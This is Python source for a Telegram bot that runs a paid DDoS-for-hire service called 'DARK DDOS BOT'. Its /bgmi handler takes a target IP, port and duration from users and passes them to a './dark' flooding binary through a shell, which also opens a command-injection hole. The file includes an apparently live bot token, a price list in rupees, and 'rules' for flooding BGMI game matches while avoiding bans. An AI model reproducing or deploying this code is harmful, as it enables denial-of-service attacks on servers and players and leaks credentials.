import telebot
import subprocess
import datetime
import os
import time
import threading
import sys
import traceback

# Insert your Telegram bot token here
bot = telebot.TeleBot('7424238580:AAEzWYhZx9VslXvGoZ5yaGxfsbU7icfrGL4')

# Admin user IDs
admin_id = ["7210717311"]

# Log file path
LOG_FILE = "log.txt"

# Channel username that users need to join (without '@')
REQUIRED_CHANNEL = "DARKXCRACKS"

# Dictionary to track the last attack time for users
last_attack_time = {}

# Dictionary to track daily attack count for users
daily_attack_count = {}

# Cooldown time in seconds 
COOLDOWN_TIME = 180

# Daily attack limit
DAILY_ATTACK_LIMIT = 3

# Flag to check if any attack is in progress
attack_in_progress = False

# Function to check if a user has joined the required channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(f"@{REQUIRED_CHANNEL}", user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
        else:
            return False
    except telebot.apihelper.ApiException:
        return False

# Function to log commands
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌"
            else:
                file.truncate(0)
                return "𝗟𝗼𝗴𝘀 𝗰𝗹𝗲𝗮𝗿𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅"
    except FileNotFoundError:
        return "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝗨𝗻𝗱 ❌"

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to send a response after an attack command
def start_attack_reply(message, target, port, time):
    user_id = message.chat.id
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    remaining_attacks = DAILY_ATTACK_LIMIT - daily_attack_count.get(user_id, {"count": 0})["count"]
    attacks = remaining_attacks - 1
    response = (f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n"
                f"𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n"
                f"𝗧𝗶𝗺𝗲: {time} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀\n"
                f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}\n"
                f"𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗮𝘁𝘁𝗮𝗰𝗸𝘀: {attacks}")
    
    # Send the reply to the user
    bot.reply_to(message, response)

# Command: /start
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.chat.id
    if not is_user_in_channel(user_id):
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗷𝗼𝗶𝗻 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 @DARKXCRACKS 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁")
    else:
        response = "🔆 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗗𝗔𝗥𝗞 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 🔆"
        bot.reply_to(message, response)

# Command: /attack
@bot.message_handler(commands=['bgmi'])
def handle_attack(message):
    global attack_in_progress

    user_id = message.chat.id
    if not is_user_in_channel(user_id):
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗷𝗼𝗶𝗻 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 @DARKXCRACKS 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁.")
        return

    if attack_in_progress:
        bot.reply_to(message, "❗️𝗔𝗻 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀.❗️")
        return

    current_time = time.time()
    if user_id in last_attack_time:
        elapsed_time = current_time - last_attack_time[user_id]
        if elapsed_time < COOLDOWN_TIME:
            wait_time = int(COOLDOWN_TIME - elapsed_time)
            bot.reply_to(message, f"❗️𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝘁𝗼 𝘄𝗮𝗶𝘁 {wait_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 /attack 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗮𝗴𝗮𝗶𝗻.")
            return

    today = datetime.date.today()
    if user_id not in daily_attack_count:
        daily_attack_count[user_id] = {"count": 0, "last_reset": today}

    if daily_attack_count[user_id]["last_reset"] != today:
        daily_attack_count[user_id] = {"count": 0, "last_reset": today}

    if daily_attack_count[user_id]["count"] >= DAILY_ATTACK_LIMIT:
        bot.reply_to(message, "❗️𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗿𝗲𝗮𝗰𝗵𝗲𝗱 𝘁𝗵𝗲 𝗱𝗮𝗶𝗹𝘆 𝗮𝘁𝘁𝗮𝗰𝗸 𝗹𝗶𝗺𝗶𝘁.❗️")
        return

    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        port = int(command[2])
        attack_time = int(command[3])

        if attack_time > 180:
            bot.reply_to(message, "❗️𝗘𝗿𝗿𝗼𝗿: 𝗨𝘀𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗮𝗻 180 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️")
            return

        # Log and send a start attack reply
        record_command_logs(user_id, '/attack', target, port, attack_time)
        log_command(user_id, target, port, attack_time)
        start_attack_reply(message, target, port, attack_time)

        # Set attack in progress flag
        attack_in_progress = True

        # Function to execute attack and reset the flag
        def execute_attack():
            try:
                full_command = f"./dark {target} {port} {attack_time} 900"
                subprocess.run(full_command, shell=True)
                bot.reply_to(message, "✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱.")
            except Exception as e:
                bot.reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿 𝗱𝘂𝗿𝗶𝗻𝗴 𝗮𝘁𝘁𝗮𝗰𝗸: {e}")
            finally:
                global attack_in_progress
                attack_in_progress = False

        # Start the attack in a new thread
        threading.Thread(target=execute_attack).start()

        # Update last attack time and count
        last_attack_time[user_id] = current_time
        daily_attack_count[user_id]["count"] += 1
    else:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗮𝗿𝗴𝗲𝘁 𝗜𝗽, 𝗽𝗼𝗿𝘁, 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 (𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲𝘀)")
            
        
@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    response = f"🔆 𝗗𝗔𝗥𝗞 𝗗𝗗𝗢𝗦 𝗥𝗨𝗟𝗘𝗦 🔆\n\n1. Do ddos in 3 match after play 2 match normal or play 2 tdm match\n2. Do less then 25 kills to avoid ban\n3. Dont Run Too Many Attacks !! Cause A Ban From Bot\n4. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot\n5. After 1 or 2 match clear cache of your game \n\n🟢 FOLLOW THIS RULES TO AVOID 1 MONTH BAN 🟢 \n\n [ THIS RULES ONLY FOR CLASSIC ,  YOU CAN BRUTAL IN BONUS CHALLENGE AND ULTIMATE ROYALE NO ISSUE"
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    response = f"🔹𝗗𝗔𝗥𝗞 𝗗𝗗𝗢𝗦 𝗣𝗥𝗜𝗖𝗘 𝗟𝗜𝗦𝗧🔹\n\n𝖣𝖠𝖸 - 150/-𝖨𝖭𝖱\n𝖶𝖤𝖤𝖪 - 600/-𝖨𝖭𝖱\n𝖬𝖮𝖭𝖳𝖧 - 1200/-𝖨𝖭𝖱\n\nDM TO BUY @DARKVIPDDOSX"
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌"
                bot.reply_to(message, response)
        else:
            response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌"
            bot.reply_to(message, response)
    else:
        response = "💢 𝗢𝗡𝗟𝗬 𝗔𝗗𝗠𝗜𝗡 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 💢"
        bot.reply_to(message, response)

# Auto-restart mechanism
def restart_bot():
    time.sleep(1)
    python = sys.executable
    os.execl(python, python, *sys.argv)

# Start bot polling with error handling
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error occurred: {e}")
        traceback.print_exc()
        restart_bot()
